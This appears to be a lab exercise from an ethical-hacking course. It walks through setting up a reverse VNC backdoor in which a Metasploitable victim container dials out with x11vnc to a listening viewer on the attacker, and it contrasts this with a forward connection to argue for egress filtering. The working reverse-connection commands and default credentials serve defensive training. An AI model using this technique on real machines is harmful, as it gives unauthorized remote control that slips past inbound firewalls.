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16 — How to Set Up a Reverse VNC Backdoor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16 focuses on: contrasting a forward VNC connection with a reverse (outbound-initiated) VNC backdoor.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Start a VNC server on the victim and connect to it the normal (forward) way from the attacker.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Explain why an inbound-blocking firewall would stop that forward connection.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Start a listening VNC viewer on the attacker and initiate a reverse connection from the victim.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Contrast the forward and reverse connections and recommend egress controls.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TightVNC / vncserver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Serving a remote desktop session — CEH “Trojans and Other Attacks”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vncviewer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Connecting to (and listening for) VNC sessions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x11vnc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Initiating the outbound reverse connection from the inside host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Reverse remote-access channels are a core persistence and command-and-control technique; being able to demonstrate one is how this role justifies egress filtering and outbound monitoring to a client.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Vulnerable Linux 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10.30.0.30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Metasploitable 2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msfadmin / msfadmin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Start a VNC server on the victim and connect to it the normal (forward) way from the attacker.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Explain why an inbound-blocking firewall would stop that forward connection.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Start a listening VNC viewer on the attacker and initiate a reverse connection from the victim.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Contrast the forward and reverse connections and recommend egress controls.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“You showed the file channel with Netcat,” Nadia says. “Now show the interactive one. If an attacker wants Victor's actual desktop, an inbound firewall won't stop them — because the compromised machine will reach out, not in.”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wants the contrast made explicit. “Do it the obvious way first. Then flip it — have the inside host dial out to your listener — and explain why the same firewall that would block the first waves the second through. That side-by-side is the finding.”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connect to a VNC server the normal way, then establish a reverse VNC connection from the victim out to a listener on the attacker container.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On the victim, start a VNC server. (Range note: install tightvncserver/x11vnc on the victim if absent.)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docker exec -it victim vncserver :2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docker exec -it victim vncserver -list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server on display :2 (port 5902).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From the RDP desktop, connect the normal (forward) way.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vncviewer 10.30.0.30:5902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victim's desktop — this is what an inbound firewall would block.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Stop that server; start a listening viewer on the attacker.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vncviewer -listen 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attacker waiting for an incoming connection (port 5500).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From the victim, dial out to the attacker's listener (reverse).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docker exec -it victim x11vnc -connect 10.30.0.10:5500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session appearing on the attacker — the victim called out.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Confirm the reverse session is live.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victim's screen on your listening viewer.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Explain why the reverse connection succeeds where the forward one would be blocked, and name the control that detects it.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Range note: the victim container needs a VNC server and x11vnc; if they are not already installed, add tightvncserver and x11vnc to the victim image first. All steps stay inside cyberlab_net.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On the victim host (docker exec -it victim bash, become root), start a VNC server on a display (for example, :2) and list the running servers to confirm the port it opened (5900 + display number).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On the attacker container, launch a VNC viewer and connect to the victim server on that display's port, authenticating when prompted, to confirm normal remote control works within the range.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Reason about the firewall: if the victim were behind an inbound-blocking firewall, this forward connection would fail. Note why.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Stop the victim VNC server for the display you started.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On the attacker, start the VNC viewer in listen mode so it waits for an incoming (reverse) connection.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On the victim, initiate an outbound reverse connection back to the attacker's listener (x11vnc's -connect option pointing at the attacker address 10.30.0.10 and the listener port).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8. On the attacker, confirm the reverse session appears — the victim inside connected out to you — and write down why inbound firewall rules never saw it coming.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A VNC display maps to a port: display :2 listens on 5902. vncserver -list shows what's running. Forward: vncviewer &lt;host&gt;:&lt;port&gt;. The viewer must be able to reach the server — that's what an inbound firewall blocks. Reverse: start the viewer with vncviewer -listen 0, then have the inside host connect out to it. From the victim, x11vnc -connect 10.30.0.10:5500 dials the waiting viewer — the connection originates inside. The firewall inspects who initiates the connection, not what it carries — an outbound-initiated session looks like ordinary egress.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Contrast forward and reverse remote access. Get an interactive session the inbound firewall wouldn't allow.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TCP port that display :2 listens on.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Which connection direction a default firewall permits, and why.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egress control a defender should add.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40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Forward and reverse are the whole lesson. A forward connection asks the firewall to let a stranger in, and a decent firewall says no. A reverse connection has the inside machine place the call, and to the firewall that's just an employee's computer reaching out — indistinguishable, at the packet level, from normal browsing. This is why nearly every real backdoor is outbound-initiated, and why defense shifts to egress filtering, application allow-listing, and watching for unexpected outbound sessions rather than trusting the inbound wall.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victim VNC server running (with its port) and the forward vncviewer session from the attacker.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attacker viewer in listen mode waiting for a reverse connection.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established reverse VNC session on the attacker, initiated from the victim.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contrasting the forward and reverse connections and recommending the egress controls a defender should add.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lab16.txt , then last -n 10 &gt;&gt; lab16.txt , then  cat lab16.txt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TightVNC documentation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x11vnc manual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MITRE ATT&amp;CK — Remote Services: VNC (T1021.005)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MITRE ATT&amp;CK — Command and Control (TA0011)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Reverse Connections &amp; Firewall Evasion (conceptual)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